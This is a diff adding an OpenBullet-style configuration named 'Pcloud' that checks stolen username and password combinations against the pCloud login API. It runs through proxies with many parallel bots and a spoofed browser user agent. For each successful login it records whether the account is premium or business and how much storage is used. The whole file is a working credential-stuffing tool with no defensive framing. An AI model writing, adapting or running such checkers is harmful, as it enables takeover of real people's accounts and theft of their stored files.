@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "Pcloud",
+  "SuggestedBots": 50,
+  "LastModified": "2019-08-07T14:28:45.0321471+02:00",
+  "AdditionalInfo": "",
+  "Author": "DKM",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Hash MD5 "fc237cgz4wrjjph8i91j06bb004og3epzkbf" -> VAR "DID" 
+
+REQUEST GET "https://api.pcloud.com/getapiserver" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.pcloud.com" 
+  HEADER "Referer: https://www.pcloud.com/" 
+
+REQUEST POST "https://api.pcloud.com/login" 
+  CONTENT "username=<USER>&password=<PASS>&_t=1565003548286&logout=1&getlastsubscription=1&promoinfo=1&deviceid=fc237cgz4wrjjph8i91j06bb004og3epzkbf&os=4&osversion=0.0.0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.pcloud.com" 
+  HEADER "Referer: https://www.pcloud.com/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"cryptosetup\":" 
+  KEYCHAIN Failure OR 
+    KEY "\"error\": \"Log in failed.\"" 
+
+PARSE "<SOURCE>" LR "\"premium\": " "," -> CAP "Premium" 
+
+PARSE "<SOURCE>" LR "\"business\":" "," -> CAP "Business" 
+
+PARSE "<SOURCE>" LR "\"registered\":" ":" -> CAP "Registered" 
+
+PARSE "<SOURCE>" LR "\"freequota\": " "," -> VAR "TOTAL" 
+
+PARSE "<SOURCE>" LR "\"usedquota\": " "," -> VAR "USED" 
+
+FUNCTION Compute "(<TOTAL>/100)" -> VAR "TOT" 
+
+FUNCTION Compute "100-(<USED>/<TOT>)" -> CAP "Used Percentage" 
+
